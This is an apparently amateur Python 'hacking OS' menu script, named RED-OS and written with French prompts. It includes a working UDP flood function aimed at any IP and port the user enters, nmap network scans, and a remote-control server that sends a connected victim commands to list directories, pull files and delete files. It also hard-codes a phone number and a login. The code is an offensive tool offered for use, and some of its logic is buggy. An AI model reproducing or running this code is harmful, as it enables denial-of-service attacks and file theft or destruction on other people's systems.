#! /usr/bin/python

import os
import socket
import threading
import random
import os
import time
import re
import subprocess
from pystyle import Colors, Colorate

#Login
while True:
    os.system('title RED-OS')
    os.system('color c')
    accounts = {"red-os" : "root"}
    os.system('clear')

    print(Colorate.Horizontal(Colors.blue_to_cyan, """
                     ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                     ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                     ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                     ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                     ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                     ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                         ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                             ░        ░  ░   ░        ░ ░        ░  
                             ░                        
            """, 1))
    username = input("                        Entrez Le Nom D'Utilisateur: ")
    print("\n")
    os.system('clear')
    print(Colorate.Horizontal(Colors.blue_to_cyan, """
                     ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                     ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                     ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                     ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                     ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                     ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                         ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                             ░        ░  ░   ░        ░ ░        ░  
                             ░                        
            """, 1))
    password = input("                       Entrez Le mot de passe de " + username + ": ")

    #Erreur Login
    print("\n")
    os.system('clear')
    print(Colorate.Horizontal(Colors.blue_to_cyan, """
                     ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                     ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                     ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                     ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                     ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                     ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                         ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                             ░        ░  ░   ░        ░ ░        ░  
                             ░                        
            """, 1))

    #Exit
    def exitos():
        os.system('cls')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        print("                     ╔════════════════════════════════╗")
        yes = input('                     ║  Voulez vous vraiment quitter ?║\n                     ╚════════════════════════════════╝\n\n                                    Y/n > ')
        print("                     ╚════════════════════════════════╝")

        if n == 'y':
            time.sleep(2)
        pass

    #Payload
    def payload():
        import os
        import socket
        os.system('clear')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        s = socket.socket()
        host = socket.gethostname()
        port = 8080
        s.bind((host, port))
        print("")
        print("                Le serveur est en cours d'exécution ", host)
        print("")
        print("                        En attente de la connexion...")
        s.listen(1)
        conn, addr = s.accept()
        print("")
        print("                           connecté avec succes !")
        os.system('cls')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))

        # Commandes
        while 1:
            print("")
            command = input(str("                                 Command > "))
            if command == "view_cwd":
                conn.send(command.encode())
                print("")
                print("")
                files = conn.recv(5000)
                files = files.decode()
                print("                         Command output : ", files)
                print("\n")
                time.sleep(7)
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))

            elif command == "custom_dir":
                conn.send(command.encode())
                print("")
                user_input = input(str("                              Repertoir a personnalisé : "))
                conn.send(user_input.encode())
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))
                print("                               La commande a bien été envoyé")
                print("")
                files = conn.recv(5000)
                files = files.decode()
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))
                print("                               Custom Resultat : ", files)
                time.sleep(7)
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))

            elif command == "download_file":
                conn.send(command.encode())
                print("")
                filepath = input(str("                                Entrez le nom du fichier : "))
                conn.send(filepath.encode())
                file = conn.recv(100000)
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))
                filename = input(str("                   Entrez le nom du fichier dans le repertoir : "))
                new_file = open(filename, "wb")
                new_file.write(file)
                new_file.close()
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))
                print( "                            Le telechargemenet a bien été fait ")
                print("")
                time.sleep(7)
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))

            elif command == "remove_file":
                conn.send(command.encode())
                print("")
                fileanddir = input(str("                                   Nom de fichier : "))
                conn.send(fileanddir.encode())
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))
                print("                                Fichier supprimé ! ")
                time.sleep(7)
                os.system('cls')
                print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                         ░        ░  ░   ░        ░ ░        ░  
                                         ░                        
                        """, 1))



            else:
                print("")
                print("Command not recognised")
        pass

    #BRUTEFORCE
    def brut():
        import phonenumbers
        from phonenumbers import geocoder
        from phonenumbers import timezone

        gb_number = phonenumbers.parse("+33755616274", "GB")
        time = timezone.time_zones_for_number(gb_number)
        print(time)
        os.system('pause')
        pass

    #SCAN PORT
    def scanport():
        os.system('cls')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        os.system('title SCAN-PORT')
        os.system('nmap -p 1-200 192.168.1.1')
        os.system('pause')
        pass
    #DDOS
    def ddos():
        os.system('title IP-DDOS')
        os.system('cls')
        os.system('color c')

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        ip = str(input('                                   > IP: '))

        os.system('cls')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        port = int(input('                                  > Port: '))

        os.system('cls')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        sleep = float(input('                                > sleep/s: '))

        s.connect((ip, port))

        for i in range(1, 10**1000):
            s.send(random._urandom(10)*1000)
            os.system('cls')
            print(Colorate.Horizontal(Colors.blue_to_cyan, """
                             ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                             ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                             ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                             ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                             ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                             ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                             ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                 ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                     ░        ░  ░   ░        ░ ░        ░  
                                     ░                        
                    """, 1))
            print(f"                              > ATTACKING |  {i}", end='\r')
            time.sleep(sleep)



    #SCAN
    def scan():
        os.system('cls')
        #os.system('color c')
        print(Colorate.Horizontal(Colors.blue_to_cyan, """
                         ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                         ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                         ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                         ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                         ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                         ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                         ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                             ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                 ░        ░  ░   ░        ░ ░        ░  
                                 ░                        
                """, 1))
        os.system('title SCAN-IP')
        os.system('nmap -sn 192.168.1.1/24')
        os.system('pause')
        pass

    #Interface Principal
    if (accounts.get(username) == password):
        os.system('cls')
        #os.system('color c')
        print(Colorate.Horizontal(Colors.blue_to_cyan,"""
                 ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                 ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                 ▓██ ░▄█ ▒▒███   ░██   █▌▒██░  ██▒░ ▓██▄   
                 ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                 ░██▓ ▒██▒░▒████▒░▒████▓ ░ ████▓▒░▒██████▒▒
                 ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                 ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                     ░░   ░    ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                         ░        ░  ░   ░        ░ ░        ░  
                         ░                        
        """,1))
        print("              ╔════════════════════════════════════════════════╗")
        n = input("              ║ 1 > IP Ddos                      4 > BruteForce║\n              ║ 2 > Scan IP                      5 > Payload   ║\n              ║ 3 > Scan Port                    6 > EXIT      ║\n              ╚════════════════════════════════════════════════╝\n\n                               Entrez un nombre > ")
        print("              ╚════════════════════════════════════════════════╝")

        #Lancer ddos
        if n == '1':
            ddos()
        #Lancer scan
        if n == '2':
            scan()

        if n == '3':
            scanport()

        if n == '4':
            brut()

        if n == '5':
            payload()

        if n == '6':
            exitos()

    #Erreur Login
    else:
        print("                            Échec de la connexion")
        time.sleep(2)

